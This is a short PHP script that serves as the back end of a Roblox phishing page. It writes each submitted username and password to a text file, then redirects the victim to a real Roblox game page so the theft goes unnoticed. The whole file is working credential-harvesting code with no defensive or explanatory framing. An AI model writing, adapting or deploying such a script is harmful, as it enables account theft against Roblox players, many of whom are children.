<?php
// Save the submitted username and password to a file
file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

// Redirect the user to the desired Roblox game page
header('Location: https://www.roblox.com/games/15027718878/The-Space-Simulator');
exit();
?>
